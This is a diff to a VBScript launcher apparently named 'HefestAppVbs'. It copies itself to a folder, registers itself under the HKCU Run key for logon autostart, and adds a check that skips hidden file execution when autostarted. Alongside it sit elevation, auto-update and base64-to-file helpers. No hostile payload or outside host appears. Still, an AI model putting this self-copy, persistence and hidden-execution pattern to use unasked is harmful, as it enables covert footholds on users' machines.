@@ -78,19 +78,6 @@ Function GetPS1FilePath()
     GetPS1FilePath = ps1Path
 End Function
 
-Function ExecuteFileAsync(filePath, hideWindow)
-    Dim shell, result, windowStyle
-    Set shell = CreateObject("WScript.Shell")
-    If hideWindow Then
-        windowStyle = 0 ' Hidden
-    Else
-        windowStyle = 1 ' Normal
-    End If
-    result = shell.Run(filePath, windowStyle, False)
-    Set shell = Nothing
-    ExecuteFileAsync = result
-End Function
-
 Sub Run
     Dim shell
     Set shell = CreateObject("WScript.Shell")
@@ -115,7 +102,8 @@ Sub RunElevated()
 End Sub
 
 Sub DoSetAutoStart()
-    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
+    Dim registryKey, registryValue, command
+    Dim fso, shell, scriptPath, destFolder, destPath
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
@@ -123,10 +111,28 @@ Sub DoSetAutoStart()
     destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
     CreateFolder fso, destFolder
     CopyScript fso, scriptPath, destPath
-    SetAutoStart shell, destPath
+
+    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
+    registryValue = "HefestAppVbs"
+    command = "wscript.exe """ & destPath & """ autostart"
+    shell.RegWrite registryKey & registryValue, command, "REG_SZ"
+
     Set shell = Nothing
     Set fso = Nothing
 End Sub
+
+Function IsAutoStart()
+    Dim args, i
+    Set args = WScript.Arguments
+    IsAutoStart = False
+    For i = 0 To args.Count - 1
+        If LCase(args.Item(i)) = "autostart" Then
+            IsAutoStart = True
+            Exit For
+        End If
+    Next
+End Function
+
 
 Sub CreateFolder(fso, folderPath)
     If Not fso.FolderExists(folderPath) Then
@@ -138,13 +144,6 @@ Sub CopyScript(fso, sourcePath, destinationPath)
     fso.CopyFile sourcePath, destinationPath, True
 End Sub
 
-Sub SetAutoStart(shell, scriptPath)
-    Dim registryKey, registryValue, command
-    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
-    registryValue = "HefestAppVbs"
-    command = "wscript.exe """ & scriptPath & """"
-    shell.RegWrite registryKey & registryValue, command, "REG_SZ"
-End Sub
 
 
 Function DoAutoUpdate()
@@ -170,6 +169,21 @@ Function DoAutoUpdate()
 End Function
 
 
+
+Function ExecuteFileAsync(filePath, hideWindow)
+    if Not IsAutoStart Then
+        Dim shell, result, windowStyle
+        Set shell = CreateObject("WScript.Shell")
+        If hideWindow Then
+            windowStyle = 0 ' Hidden
+        Else
+            windowStyle = 1 ' Normal
+        End If
+        result = shell.Run(filePath, windowStyle, False)
+        Set shell = Nothing
+        ExecuteFileAsync = result
+    end if
+End Function
 
 
 Function DecodeBase64ToFile(base64String, outputFilePath)
